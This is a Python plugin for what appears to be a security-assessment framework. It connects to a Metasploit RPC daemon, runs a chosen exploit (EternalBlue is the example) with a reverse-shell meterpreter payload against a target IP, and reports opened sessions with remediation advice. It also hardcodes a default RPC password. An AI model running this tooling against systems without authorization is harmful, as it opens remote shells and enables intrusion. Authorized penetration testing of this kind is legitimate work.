"""
Metasploit Active Plugin - Exploitation Framework
Connects to msfrpcd daemon running on Kali host
Executes exploits and returns session information

⚠️ LEGAL WARNING:
Only use on systems you own or have explicit written permission to test.
Unauthorized exploitation is illegal and unethical.
"""
from core.plugins.base import PluginBase
from typing import Dict, Any, List
import logging

logger = logging.getLogger(__name__)


class MetasploitPlugin(PluginBase):
    """Metasploit active exploitation plugin."""
    
    name = "metasploit"
    version = "1.0.0"
    description = "Active exploitation via Metasploit Framework (msfrpcd)"
    capabilities = ["exploitation", "payload_delivery", "session_management"]
    
    required_params = ["exploit", "target", "payload"]
    optional_params = ["rhost", "rport", "lhost", "lport", "options", "msf_host", "msf_port", "msf_password"]
    
    def validate_config(self) -> None:
        """Validate plugin configuration."""
        if "exploit" not in self.config:
            raise ValueError("Missing required parameter: exploit (e.g., 'exploit/windows/smb/ms17_010_eternalblue')")
        
        if "target" not in self.config:
            raise ValueError("Missing required parameter: target (IP address)")
        
        if "payload" not in self.config:
            raise ValueError("Missing required parameter: payload (e.g., 'windows/meterpreter/reverse_tcp')")
    
    def run(self) -> Dict[str, Any]:
        """Execute Metasploit exploit."""
        exploit_path = self.config["exploit"]
        target = self.config["target"]
        payload = self.config["payload"]
        
        # msfrpcd connection (running on Kali host)
        msf_host = self.config.get("msf_host", "192.168.145.100")  # Default: Carlos's Kali IP
        msf_port = self.config.get("msf_port", 55553)
        msf_password = self.config.get("msf_password", "mypassword123")
        
        logger.info(f"Connecting to msfrpcd at {msf_host}:{msf_port}")
        
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            
            # Connect to Metasploit RPC
            client = MsfRpcClient(
                password=msf_password,
                server=msf_host,
                port=msf_port,
                ssl=False
            )
            
            msf_version = client.core.version()
            logger.info(f"Connected to Metasploit {msf_version}")
            
            # Get exploit module
            exploit = client.modules.use('exploit', exploit_path)
            
            # Configure exploit
            exploit['RHOST'] = target
            if 'rport' in self.config:
                exploit['RPORT'] = self.config['rport']
            
            # Set payload
            exploit.payload = payload
            
            # Configure payload
            lhost = self.config.get('lhost', msf_host)  # Default to Kali IP
            lport = self.config.get('lport', 4444)
            exploit['LHOST'] = lhost
            exploit['LPORT'] = lport
            
            # Additional options
            if 'options' in self.config:
                for key, value in self.config['options'].items():
                    exploit[key] = value
            
            logger.info(f"Executing exploit {exploit_path} against {target}")
            
            # Execute exploit
            result = exploit.execute()
            
            # Wait a bit for session establishment
            import time
            time.sleep(5)
            
            # Check for sessions
            sessions = client.sessions.list
            
            return {
                "raw_output": {
                    "exploit_result": str(result),
                    "sessions": sessions,
                    "exploit_config": {
                        "path": exploit_path,
                        "target": target,
                        "payload": payload,
                        "lhost": lhost,
                        "lport": lport
                    },
                    "msf_version": msf_version
                },
                "artifacts": [],
                "metadata": {
                    "msf_version": msf_version,
                    "exploit": exploit_path,
                    "target": target,
                    "sessions_count": len(sessions)
                }
            }
        
        except Exception as e:
            logger.error(f"Metasploit execution failed: {str(e)}")
            raise Exception(f"Metasploit RPC error: {str(e)}")
    
    def parse_output(self, raw_output: Any) -> List[Dict[str, Any]]:
        """Parse Metasploit output into findings."""
        findings = []
        
        if isinstance(raw_output, dict):
            sessions = raw_output.get("sessions", {})
            exploit_config = raw_output.get("exploit_config", {})
            msf_version = raw_output.get("msf_version", "Unknown")
        else:
            return findings
        
        # Check if exploitation was successful
        if sessions:
            for session_id, session_info in sessions.items():
                findings.append({
                    'title': f"Successful exploitation - Session {session_id} opened",
                    'severity': 'critical',
                    'description': (
                        f"Metasploit successfully exploited the target and obtained a session.\n\n"
                        f"Target: {exploit_config.get('target', 'N/A')}\n"
                        f"Exploit: {exploit_config.get('path', 'N/A')}\n"
                        f"Payload: {exploit_config.get('payload', 'N/A')}\n"
                        f"Session Type: {session_info.get('type', 'N/A')}\n"
                        f"Session Info: {session_info.get('info', 'N/A')}\n"
                        f"Metasploit Version: {msf_version}\n\n"
                        f"The attacker now has {len(sessions)} active session(s) on the target system."
                    ),
                    'remediation': (
                        "IMMEDIATE ACTION REQUIRED:\n"
                        "1. Isolate the compromised system from the network\n"
                        "2. Kill all suspicious processes and network connections\n"
                        "3. Apply security patches for the exploited vulnerability\n"
                        "4. Conduct full forensic analysis\n"
                        "5. Reset all credentials on the compromised system\n"
                        "6. Implement network segmentation and IDS/IPS\n"
                        "7. Review security monitoring and detection capabilities"
                    ),
                    'raw_data': {
                        'session_id': session_id,
                        'session_info': session_info,
                        'exploit_config': exploit_config
                    }
                })
        else:
            # Exploitation failed
            findings.append({
                'title': f"Exploitation attempt failed on {exploit_config.get('target', 'N/A')}",
                'severity': 'info',
                'description': (
                    f"Metasploit exploit execution completed but no session was obtained.\n\n"
                    f"Exploit: {exploit_config.get('path', 'N/A')}\n"
                    f"Target: {exploit_config.get('target', 'N/A')}\n"
                    f"Payload: {exploit_config.get('payload', 'N/A')}\n"
                    f"Metasploit Version: {msf_version}\n\n"
                    f"Possible reasons:\n"
                    f"- Target is not vulnerable to this exploit\n"
                    f"- Exploit failed due to target configuration\n"
                    f"- Network/firewall blocking the payload connection\n"
                    f"- Target security software detected and blocked the attack\n"
                    f"- Incorrect target or payload configuration"
                ),
                'remediation': (
                    "Continue security assessment with other techniques. "
                    "The failed exploitation indicates the target may have adequate protections."
                ),
                'raw_data': exploit_config
            })
        
        logger.info(f"Parsed {len(findings)} findings from Metasploit output")
        return findings
